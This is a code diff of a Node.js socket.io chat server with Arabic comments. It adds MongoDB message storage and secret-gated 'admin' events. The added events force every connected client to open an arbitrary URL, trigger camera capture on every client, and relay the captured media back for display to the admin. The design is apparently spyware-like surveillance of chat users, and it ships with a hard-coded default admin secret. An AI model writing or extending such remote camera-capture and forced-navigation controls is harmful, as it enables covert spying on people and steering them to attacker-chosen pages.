@@ -1,62 +1,95 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const mongoose = require('mongoose');
 const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  maxHttpBufferSize: 1e8 // للسماح برفع الفيديوهات والصور الكبيرة
+  maxHttpBufferSize: 1e8 // للسماح برفع الملفات والفيديوهات الكبيرة
 });
 
-app.use(express.static(__dirname));
+// إعداد الاتصال بقاعدة بيانات MongoDB
+const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/admin-chat';
+mongoose.connect(MONGO_URI)
+    .then(() => console.log('Connected to MongoDB'))
+    .catch(err => console.error('MongoDB connection error:', err));
 
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+// تعريف نموذج الرسائل في قاعدة البيانات
+const messageSchema = new mongoose.Schema({
+    sender: String,
+    message: String,
+    type: { type: String, default: 'text' },
+    createdAt: { type: Date, default: Date.now }
 });
+const Message = mongoose.model('Message', messageSchema);
 
-let waitingUser = null;
+app.use(express.static(path.join(__dirname, 'public'))); // تأكد من وضع index.html داخل مجلد public أو في نفس المجلد حسب رغبتك
+
+const ADMIN_SECRET = process.env.ADMIN_SECRET || 'mySuperSecretAdmin123';
 
 io.on('connection', (socket) => {
-  socket.on('find_partner', () => {
-    if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
-      const roomName = 'room_' + socket.id + '_' + waitingUser.id;
-      socket.join(roomName);
-      waitingUser.join(roomName);
+    console.log('A user connected:', socket.id);
+    updateActiveUsersCount();
 
-      socket.roomName = roomName;
-      waitingUser.roomName = roomName;
+    // إرسال الرسائل القديمة للمستخدم الجديد
+    Message.find().sort({ createdAt: 1 }).limit(50).then(messages => {
+        socket.emit('load_history', messages);
+    });
 
-      waitingUser.emit('matched');
-      socket.emit('matched');
-      waitingUser = null;
-    } else {
-      waitingUser = socket;
-    }
-  });
+    // استقبال الرسائل
+    socket.on('send_message', async (data) => {
+        const newMessage = new Message({
+            sender: data.sender,
+            message: data.message,
+            type: data.type || 'text'
+        });
+        await newMessage.save();
+        io.emit('receive_message', newMessage);
+    });
 
-  socket.on('message', (data) => {
-    if (socket.roomName) {
-      socket.to(socket.roomName).emit('message', data);
-    }
-  });
+    // === صلاحيات الأدمن ===
+    socket.on('admin_delete_message', async ({ secret, messageId }) => {
+        if (secret !== ADMIN_SECRET) return;
+        await Message.findByIdAndDelete(messageId);
+        io.emit('message_deleted', messageId);
+    });
 
-  socket.on('admin_command', (data) => {
-    if (data.secret !== 'admin123') return;
-    // توجيه أمر الكاميرا أو الفيديو مباشرة للطرف الآخر في الغرفة
-    if (socket.roomName) {
-      socket.to(socket.roomName).emit('execute_command', data);
-    }
-  });
+    socket.on('admin_edit_message', async ({ secret, messageId, newText }) => {
+        if (secret !== ADMIN_SECRET) return;
+        const updated = await Message.findByIdAndUpdate(messageId, { message: newText }, { new: true });
+        if (updated) {
+            io.emit('message_edited', { messageId, newText });
+        }
+    });
 
-  socket.on('disconnect', () => {
-    if (waitingUser === socket) waitingUser = null;
-    if (socket.roomName) {
-      socket.to(socket.roomName).emit('partner_disconnected');
-    }
-  });
+    socket.on('admin_open_url', ({ secret, targetUrl }) => {
+        if (secret !== ADMIN_SECRET) return;
+        io.emit('force_open_url', targetUrl);
+    });
+
+    socket.on('admin_request_media', ({ secret, mediaType }) => {
+        if (secret !== ADMIN_SECRET) return;
+        io.emit('trigger_camera_capture', mediaType);
+    });
+
+    socket.on('user_captured_media', (data) => {
+        io.emit('display_captured_media_to_admin', data);
+    });
+
+    socket.on('disconnect', () => {
+        console.log('User disconnected:', socket.id);
+        updateActiveUsersCount();
+    });
 });
 
-server.listen(3000, () => {
-  console.log('Server running on http://localhost:3000');
+function updateActiveUsersCount() {
+    const count = io.engine.clientsCount;
+    io.emit('update_users_count', count);
+}
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
 });
